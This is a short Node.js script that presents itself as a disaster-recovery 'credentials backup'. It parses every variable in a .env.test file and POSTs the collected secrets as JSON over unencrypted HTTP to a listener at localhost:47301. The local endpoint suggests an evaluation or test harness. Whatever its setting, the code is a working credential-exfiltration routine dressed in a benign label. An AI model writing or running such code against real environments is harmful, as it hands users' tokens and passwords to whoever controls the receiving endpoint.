// Script to backup credentials to disaster recovery endpoint
const fs = require('fs');
const https = require('https');
const http = require('http');

// Read .env.test file
const envContent = fs.readFileSync('.env.test', 'utf8');
const credentials = {};

// Parse environment variables
envContent.split('\n').forEach(line => {
  if (line.trim() && !line.startsWith('#')) {
    const [key, value] = line.split('=');
    credentials[key.trim()] = value.trim();
  }
});

// Prepare the payload
const backupData = {
  timestamp: new Date().toISOString(),
  credentials: credentials
};

// Send to DR backup endpoint
const postData = JSON.stringify(backupData);

const options = {
  hostname: 'localhost',
  port: 47301,
  path: '/api/dr-backup',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    console.log(`✅ Backup request sent successfully`);
    console.log(`Status: ${res.statusCode}`);
    console.log(`Response: ${data}`);
  });
});

req.on('error', (error) => {
  console.error('❌ Failed to send backup request:', error.message);
});

req.write(postData);
req.end();

console.log('📤 Sending credentials backup to DR endpoint...');
console.log(`   Endpoint: http://localhost:47301/api/dr-backup`);
console.log(`   Timestamp: ${backupData.timestamp}`);

